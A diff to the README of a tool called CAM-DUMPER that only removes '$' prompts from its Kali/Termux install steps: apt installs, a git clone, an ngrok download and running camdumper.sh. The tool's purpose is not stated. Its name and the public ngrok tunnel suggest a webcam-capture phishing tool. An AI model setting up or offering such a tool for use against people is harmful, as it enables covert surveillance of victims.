@@ -11,36 +11,36 @@
 
 ## Installing (Kali Linux/Termux):
 
-$
+
 ```
- apt update && apt upgrade
-```
-```
-$ apt install git
+apt update && apt upgrade
 ```
 ```
-$ apt install php wget curl jq
+apt install git
 ```
 ```
-$ git clone https://github.com/LiNuX-Mallu/CAM-DUMPER.git
+apt install php wget curl jq
 ```
 ```
-$ cd CAM-DUMPER
+git clone https://github.com/LiNuX-Mallu/CAM-DUMPER.git
 ```
 ```
-$ wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip && unzip *.zip && rm *.zip
+cd CAM-DUMPER
 ```
 ```
-$ chmod +x camdumper.sh ngrok
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip && unzip *.zip && rm *.zip
 ```
 ```
-$ echo "web_addr: 4045" >> $HOME/.ngrok2/ngrok.yml
+chmod +x camdumper.sh ngrok
 ```
 ```
-$ ./camdumper.sh
+echo "web_addr: 4045" >> $HOME/.ngrok2/ngrok.yml
+```
+```
+./camdumper.sh
 ```
 • if $HOME/.ngrok2/ngrok.yml doesnt exist then
 you must create it by running-
 ```
-$ mkdir $HOME/.ngrok2 && touch $HOME/.ngrok2/ngrok.yml
+mkdir $HOME/.ngrok2 && touch $HOME/.ngrok2/ngrok.yml
 ```
